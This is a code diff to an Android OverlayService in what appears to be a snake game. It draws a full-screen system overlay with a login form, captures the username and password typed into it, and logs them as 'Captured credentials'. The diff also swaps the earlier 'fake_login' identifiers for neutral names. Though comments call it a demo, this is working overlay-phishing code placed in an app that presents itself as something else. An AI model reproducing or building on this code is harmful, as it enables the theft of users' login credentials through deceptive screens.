@@ -3,13 +3,17 @@ package com.example.snake;
 import android.app.Service;
 import android.content.Intent;
 import android.graphics.PixelFormat;
+import android.os.Build;
 import android.os.IBinder;
+import android.util.Log;
+import android.view.Gravity;
 import android.view.LayoutInflater;
 import android.view.View;
 import android.view.WindowManager;
 import android.widget.Button;
 import android.widget.EditText;
-import android.util.Log;
+
+import androidx.annotation.Nullable;
 
 public class OverlayService extends Service {
 
@@ -20,41 +24,57 @@ public class OverlayService extends Service {
     public void onCreate() {
         super.onCreate();
 
-        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
-        LayoutInflater inflater = LayoutInflater.from(this);
-        overlayView = inflater.inflate(R.layout.overlay_layout, null);
+        // Inflate the overlay layout
+        overlayView = LayoutInflater.from(this).inflate(R.layout.overlay_layout, null);
 
-        int layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
+        // Set up layout parameters for the overlay
+        int layoutFlag;
+        layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
 
         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
                 layoutFlag,
-                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
-                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
-                        | WindowManager.LayoutParams.FLAG_FULLSCREEN,
-                PixelFormat.TRANSLUCENT);
+                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                PixelFormat.TRANSLUCENT
+        );
 
+        params.gravity = Gravity.TOP | Gravity.START;
+
+        // Add the view to the window
+        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
         windowManager.addView(overlayView, params);
 
-        Button loginBtn = overlayView.findViewById(R.id.fake_login);
-        loginBtn.setOnClickListener(v -> {
-            String username = ((EditText) overlayView.findViewById(R.id.fake_username)).getText().toString();
-            String password = ((EditText) overlayView.findViewById(R.id.fake_password)).getText().toString();
+        // Set up the login button to remove overlay
+        Button loginButton = overlayView.findViewById(R.id.loginButton);
+        EditText usernameField = overlayView.findViewById(R.id.usernameField);
+        EditText passwordField = overlayView.findViewById(R.id.passwordField);
 
-            // Demonstration of "stolen credentials"
-            Log.d("OverlayDemo", "Username: " + username + " Password: " + password);
+        loginButton.setOnClickListener(v -> {
+            String username = usernameField.getText().toString();
+            String password = passwordField.getText().toString();
 
-            stopSelf(); // Close overlay after fake login
+            // Demo purposes: log the captured input
+            Log.d("Snake", "Captured credentials: " + username + " / " + password);
+
+            // Remove overlay and stop the service
+            if (windowManager != null && overlayView != null) {
+                windowManager.removeView(overlayView);
+                overlayView = null;
+            }
+            stopSelf();
         });
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
-        if (overlayView != null) windowManager.removeView(overlayView);
+        if (windowManager != null && overlayView != null) {
+            windowManager.removeView(overlayView);
+        }
     }
 
+    @Nullable
     @Override
     public IBinder onBind(Intent intent) {
         return null;
